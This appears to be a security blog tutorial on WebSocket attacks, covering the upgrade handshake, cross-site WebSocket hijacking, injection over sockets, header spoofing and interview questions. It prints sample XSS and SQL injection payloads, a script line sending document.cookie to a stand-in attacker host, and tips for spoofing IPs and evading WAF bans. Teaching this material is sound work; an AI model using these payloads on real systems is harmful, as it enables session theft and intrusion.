---
layout: mission
title: "WebSocket Attacks: The Theory & Mechanics (Part 1)"
date: 2026-01-07
categories: [Web Security, Theory, Protocols]
toc: true
---

# 🔌 WebSocket Attacks: Understanding the Mechanics

WebSockets have revolutionized modern web applications by enabling real-time, bidirectional communication. However, this persistent connection model introduces a unique attack surface that often bypasses traditional HTTP security controls.

This guide explores the fundamental architecture of WebSockets, how the handshake works, and the theoretical mechanics behind common vulnerabilities like Cross-Site WebSocket Hijacking (CSWSH) and Socket Smuggling.

---

## 🔸 1. What are WebSockets?

The WebSocket protocol (`ws://` and `wss://`) provides a full-duplex communication channel over a single TCP connection. Unlike HTTP, which follows a request-response model (Client asks -> Server answers -> Connection closes), WebSockets keep the line open.

### Key Differences from HTTP

| Feature | HTTP/REST | WebSockets |
| :--- | :--- | :--- |
| **Connection** | Short-lived (Request/Response) | Persistent (Long-lived) |
| **Direction** | Unidirectional (Client pulls) | Bidirectional (Server pushes) |
| **Overhead** | High (Headers sent every time) | Low (Headers sent once) |
| **State** | Stateless | Stateful |

### Why use them?
WebSockets are the engine behind any feature that requires "Live" data:
Chat applications
Real-time notifications
Multiplayer gaming
Live financial tickers

---

## 🤝 2. The Handshake: Establishing the Connection

A WebSocket connection doesn't start as a socket; it starts as a standard HTTP request. This is known as the **Handshake**.

### The Client Request (Upgrade)
To open a socket, the client sends a GET request with special headers telling the server to switch protocols.

```
GET /chat HTTP/1.1
Host: chat.example.com
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Origin: [https://example.com](https://example.com)
Cookie: session=xyz123
```

**`Connection: Upgrade` & `Upgrade: websocket`**: Tells the server to switch protocols.
    
**`Sec-WebSocket-Key`**: A random Base64 value used to prevent accidental caching proxies from breaking the connection.
    
**`Origin`**: Crucial for security (similar to CORS). It tells the server who initiated the connection.
    

### The Server Response (101 Switching Protocols)

If the server accepts the connection, it replies with a `101` status code.

```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```

Once this response is sent, the HTTP connection is "upgraded." The raw TCP socket remains open, and binary frames can now be exchanged freely.

---

## 🧨 3. The Attack Surface: Where things go wrong

WebSockets inherit almost all vulnerabilities found in standard HTTP, but often lack the standard defenses (WAFs, CSRF tokens, Input Sanitization) because traffic is opaque to many security tools.

### A. Input Sanitization Failures (Injection)

Once the connection is established, messages are often treated as "trusted" streams.

**XSS:** If a chat message is rendered directly into the DOM without escaping, `{"message": "<img src=x onerror=alert(1)>"}` becomes a Stored XSS attack.
    
**SQL Injection:** If the backend uses message data directly in queries (e.g., `{"id": "1' OR 1=1--"}`), it is vulnerable to SQLi.
    

### B. Broken Access Control (CSWSH)

Cross-Site WebSocket Hijacking (CSWSH) is the WebSocket equivalent of CSRF.

**The Flaw:** WebSockets do not have a "Same-Origin Policy" (SOP). A malicious site (`evil.com`) can initiate a connection to `bank.com/ws`.
    
**The Mechanism:** If the handshake relies solely on **Cookies** for authentication and does not validate the `Origin` header, the browser sends the victim's cookies automatically.
    
**The Impact:** The attacker gains a two-way pipe to the victim's session, allowing them to read private data (unlike standard CSRF, which is write-only).
    

### C. Handshake Smuggling & Spoofing

Since the handshake is just HTTP, it can be manipulated.

1. **IP Spoofing:** Injecting headers like `X-Forwarded-For: 127.0.0.1` during the handshake can bypass IP restrictions or rate limits.
    
2. **Session Fixation:** If the server accepts session IDs via URL parameters or headers during the handshake, an attacker might be able to force a victim to use a known session ID.
    
---

# 🧨 Deep Dive: The WebSocket Attack Surface

The unique architecture of WebSockets—starting as HTTP and upgrading to a persistent binary stream—creates three distinct zones where security controls often fail.

## A. Input Sanitization Failures (The "Invisible" Stream)

**The Problem:** Traditional security tools (WAFs, IDS/IPS) are designed to inspect discrete HTTP requests. They look for malicious patterns in the URL, Headers, and Body.

**The Blind Spot:** Once the server returns `101 Switching Protocols`, the HTTP connection effectively "ends" for the WAF. The traffic shifts to a stream of WebSocket frames. Many WAFs stop inspecting at this point, creating a tunnel where payloads pass undetected.
    

### 1. Cross-Site Scripting (XSS) via WebSockets

If the application treats the WebSocket stream as a "trusted" internal channel, it may reflect messages to other users without encoding.

**Mechanism:** An attacker connects to a chat socket and sends a JSON payload: `{"message": "<img src=x onerror=alert(1)>"}`.
    
**Impact:** If the frontend renders this directly (e.g., using `innerHTML` instead of `innerText`), the script executes in every participant's browser.
    
**Bypassing Filters:** Even if there is a filter, it often resides on the _client-side_ (JavaScript). An attacker using Burp Suite pushes the payload directly into the socket, completely bypassing client-side validation.
    

### 2. SQL Injection (SQLi) over WebSockets

Backend logic often parses WebSocket messages and feeds them directly into database queries.

**Mechanism:** Consider a socket that retrieves user details: `{"action": "get_user", "id": "101"}`.
    
**The Exploit:** An attacker modifies the frame: `{"action": "get_user", "id": "101' OR '1'='1"}`.
    
**Result:** If the backend concatenates this `id` into a SQL query (`SELECT * FROM users WHERE id = '$id'`), the database dumps the entire user table back through the socket.
    

### 3. Blind Injection (OAST)

Often, WebSocket errors are suppressed to prevent crashing the persistent connection.

**The Technique:** Attackers use **Out-of-Band (OAST)** payloads. They inject a payload that forces the server to make a DNS or HTTP request to an attacker-controlled domain (like Burp Collaborator).
    
**Payload:** `{"message": "<script>new Image().src='http://attacker.oast.me?cookie='+document.cookie;</script>"}`. If the attacker sees a DNS lookup on their server, the vulnerability is confirmed.
    

---

## B. Broken Access Control (CSWSH)

**The Problem:** Cross-Site WebSocket Hijacking (CSWSH) is the WebSocket equivalent of CSRF, but significantly more dangerous because it allows **bidirectional** data theft.

### 1. The Origin Failure

WebSockets do not enforce the **Same-Origin Policy (SOP)** by default. A script running on `attacker.com` is technically allowed to initiate a connection to `wss://bank.com/chat`.

**The Handshake:** When the browser sends the initial `GET /chat` request to upgrade the connection, it **automatically attaches cookies**, just like any standard HTTP request.
    

### 2. The Exploit Chain

1. **Victim** is logged into `bank.com`.
    
2. **Attacker** sends a link to `evil-site.com`.
    
3. **Victim** clicks the link.
    
4. **Evil Site** runs JS: `var ws = new WebSocket('wss://bank.com/chat');`
    
5. **Browser** sends the handshake to `bank.com` _with the victim's session cookies_.
    
6. **Server** sees valid cookies and accepts the connection (Status 101).
    
7. **Impact:** The attacker now has a live socket to the victim's account. They can send commands ("Transfer money") and _read the responses_ ("Balance is $1M").
    

### 3. Prevention Failure

This vulnerability exists solely because the server failed to validate the `Origin` header during the handshake. If the server checked `Origin: https://evil-site.com` and rejected it, the attack would fail.

---

## C. Handshake Smuggling & Spoofing

**The Problem:** The "Handshake" is just a standard HTTP GET request. This means it is vulnerable to all standard HTTP header attacks before the socket is even established.

### 1. IP Spoofing (Bypassing Rate Limits)

WebSockets are expensive resources. Servers often rate-limit them by IP.

**The Exploit:** An attacker intercepts the handshake in Burp Suite and injects: `X-Forwarded-For: 1.2.3.4`.
    
**Result:** The server thinks the request is from a new IP and resets the rate limit counter. By rotating this IP (`1.2.3.5`, `1.2.3.6`), the attacker can brute-force indefinitely.
    

### 2. Session Fixation/Hijacking

Some implementations allow passing session tokens via URL parameters or custom headers during the handshake to "link" the socket to a user.

**The Exploit:** An attacker crafts a URL: `wss://app.com/chat?session_id=ATTACKER_SESSION`.
    
**Result:** If the victim clicks this, their WebSocket initializes using the attacker's session ID. The attacker can then view the chat history or activity generated by the victim.
    

### 3. Protocol Downgrade

The header `Sec-WebSocket-Version` dictates the protocol version.

**The Exploit:** An attacker changes this to a lower version (e.g., `Sec-WebSocket-Version: 8` or older).
    
**Result:** If the server supports legacy versions, it might revert to a protocol with known security flaws that were patched in Version 13.
    

---

## 🛠️ 4. Tools of the Trade

Standard HTTP proxies often struggle with WebSocket frames. To test effectively, you need tools that can intercept and manipulate the stream _after_ the handshake.

### Burp Suite

**Intercept:** Allows you to pause and modify individual frames in real-time.
    
**Repeater:** You cannot "repeat" a flow easily, but you can repeat the _Handshake_ to test for CSWSH.
    
**WebSocket History:** A dedicated tab to view the stream of JSON/Text messages.
    

### WS-Repl / wscat

Command-line tools useful for scripting interactions or bypassing browser-side restrictions.

---

## ❓ 5. Interview Corner: Common FAQs

Q1: How does Cross-Site WebSocket Hijacking (CSWSH) differ from CSRF?

Answer:

1. **Direction:** CSRF is typically "blind" (write-only); the attacker sends a request but can't see the response. CSWSH allows full **read/write** access because the attacker opens a persistent socket.
    
2. **Mechanism:** CSWSH exploits the lack of SOP and Origin validation during the Upgrade handshake, whereas CSRF exploits state-changing HTTP requests.
    

Q2: Why do standard WAFs often miss WebSocket attacks?

Answer: WAFs are designed to inspect HTTP requests (Headers, Body, URL). Once the protocol upgrades to WebSocket (Status 101), the traffic becomes a stream of binary frames. Unless the WAF is specifically configured to decode and inspect WebSocket frames, the malicious payloads pass through invisible tunnels.


Q3: What header is critical for preventing CSWSH?

Answer: The Origin header. The server must check this header during the handshake to ensure the connection request is coming from a trusted domain. If it is missing or incorrect, the server should reject the handshake (403 Forbidden).


Q4: Can you perform SQL Injection over WebSockets?

Answer: Yes. If the backend takes data from a WebSocket message (e.g., {"user_id": 100}) and concatenates it into a SQL query without parameterization, it is just as vulnerable as a standard HTTP parameter.


Q5: Can you perform a "Blind" SQL Injection over WebSockets? If so, how?

Answer: Yes. Just like HTTP, if the application executes the query but returns no error, you can use Time-Based payloads (e.g., WAITFOR DELAY '0:0:5') or Out-of-Band (OAST) techniques (triggering a DNS lookup to Burp Collaborator) to confirm the injection.


Q6: What is the security risk of using ws:// instead of wss://?

Answer: ws:// is unencrypted (cleartext). This allows Man-in-the-Middle (MITM) attackers to intercept the handshake, steal session cookies, or read/modify the WebSocket messages in transit. wss:// enforces TLS encryption.


Q7: Explain how "Session Fixation" can occur during a WebSocket handshake.

Answer: If the application accepts a session identifier via URL parameters (e.g., ?session=...) during the handshake, an attacker can trick a victim into clicking a link with a pre-set session ID. The victim connects using that ID, allowing the attacker (who knows the ID) to hijack the session.


Q8: What is the purpose of the Sec-WebSocket-Key header? Is it for security?

Answer: It is not for authentication or security. It is a random Base64 value used to ensure that the server and client are speaking the WebSocket protocol and to prevent caching proxies from returning stale responses. It does not prove user identity.


Q9: If a WebSocket application sanitizes input on the client-side using JavaScript, is it secure?

Answer: No. An attacker can use an intercepting proxy (like Burp Suite) to modify the WebSocket frames after they leave the browser but before they reach the server, completely bypassing the client-side logic.


Q10: What HTTP status code indicates a successful WebSocket connection?

Answer: 101 Switching Protocols. This confirms the server has accepted the "Upgrade" request and the connection is now a WebSocket stream.


Q11: What is the fundamental difference between Cross-Site WebSocket Hijacking (CSWSH) and standard CSRF?

Answer: CSRF is typically a "blind" write-only attack (the attacker sends a request but cannot see the response due to SOP). CSWSH establishes a persistent two-way connection, allowing the attacker to both send commands and read the responses containing sensitive data.


Q12: Why do standard WAFs often fail to detect SQL Injection sent over WebSockets?

Answer: WAFs are primarily designed to inspect HTTP requests (Headers, URL, Body). Once the connection upgrades to WebSocket (Status 101), the traffic becomes a stream of frames. Unless the WAF is configured to decode and inspect these frames, the malicious payloads pass through an unmonitored tunnel.


Q13: Which specific HTTP header MUST be validated to prevent CSWSH?

Answer: The Origin header. The server must check this header during the initial HTTP handshake to ensure the connection request is initiating from a trusted domain.


Q14: How can an attacker bypass IP-based rate limiting on a WebSocket login endpoint?

Answer: By manipulating the handshake request. The attacker can inject headers like X-Forwarded-For or Client-IP with random IP addresses to trick the server into believing the requests are coming from different users.


---


# 🎭 Scenario-Based Questions (Bar Raiser)

Scenario 1: The "Secure" Chat

Context: You are testing a banking chat bot. The developer says, "We use WebSockets, so XSS isn't possible because it's not HTML." You send <img src=x onerror=alert(1)> and nothing happens.

Question: How do you proceed?

Answer:

"I would test for Blind XSS or Client-Side Template Injection. Just because the raw HTML didn't render doesn't mean it's safe.

1. I'd verify if the input is reflected to _other_ users (like the support agent). My payload might not execute in my chat window but could execute in the admin's dashboard.
    
2. I'd try obfuscation (`<svg/onload=alert(1)>`) or case variation (`<ScRiPt>`) to bypass simple filters.
    
3. I'd check if the chat supports Markdown or other formatting that could be abused.".
    

Scenario 2: The CSWSH Defense

Context: You found a CSWSH vulnerability. The developer fixes it by checking the Referer header.

Question: Is this sufficient? How would you bypass it?

Answer:

"It is unreliable. The Referer header can be spoofed in some scenarios or omitted entirely by privacy settings/browser policies.

Bypass: I would try to suppress the Referer header using <meta name="referrer" content="no-referrer"> on my exploit page. If the server logic is 'Allow if Referer matches OR if Referer is null', the attack will still work. The correct fix is validating the Origin header or using CSRF tokens."

Scenario 3: The WAF Block

Context: You try to send a SQL injection payload via WebSocket (' OR 1=1), but the connection instantly drops. You cannot reconnect for 5 minutes.

Question: What is happening, and how do you continue testing?

Answer:

"The WAF or IPS has detected the malicious payload in the stream and banned my IP address.

Solution:

1. **IP Rotation:** I would modify the handshake request in Burp Repeater to include `X-Forwarded-For: 10.0.0.1`. If that doesn't work, I'd use a proxy pool or VPN rotation.
    
2. **Obfuscation:** I would try to obfuscate the SQL payload (e.g., using SQL comments `/**/` or encoding) to evade the specific signature that triggered the WAF.".
    

Scenario 4: The Token Handshake

Context: The WebSocket handshake requires a ?token=XYZ parameter. You find that this token allows you to connect as User A. You change the token to User B's token, but the connection is rejected. However, if you change the Cookie header to User B's session, it connects.

Question: What vulnerability is this?

Answer:

"This indicates a Priority Logic Flaw in authentication. The server appears to check the Cookie before or instead of the Token validation in some paths. If the Token was intended to be the primary security control (e.g., a CSRF token), bypassing it using just a Cookie allows for Cross-Site WebSocket Hijacking, as cookies are sent automatically by the browser."

Scenario 5: The "Hidden" Data

Context: You are testing a stock trading app. The WebSocket stream sends JSON data like {"symbol": "AAPL", "price": 150}. You want to see if you can access premium data.

Question: How do you test for IDOR here?

Answer:

"I would analyze the 'Subscription' messages sent by the client.

1. Capture the frame where the client asks for data: `{"subscribe": "AAPL"}`.
    
2. **Fuzzing:** I would try to subscribe to symbols or IDs that might be restricted or hidden, such as `{"subscribe": "ADMIN_feed"}`, `{"subscribe": "USER_123_portfolio"}`, or simply iterating IDs.
    
3. **Analysis:** If the server returns data for these restricted feeds without checking my subscription tier or user ID, it is an Access Control vulnerability.".

---
## 🛑 Summary of Part 1

1. **Architecture:** WebSockets provide persistent, bidirectional comms via a single TCP connection.
    
2. **Handshake:** Starts as HTTP Upgrade; susceptible to header manipulation and IP spoofing.
    
3. **Vulnerabilities:** Inherits HTTP flaws (Injection, Broken Auth) plus unique flaws like CSWSH due to lack of SOP.
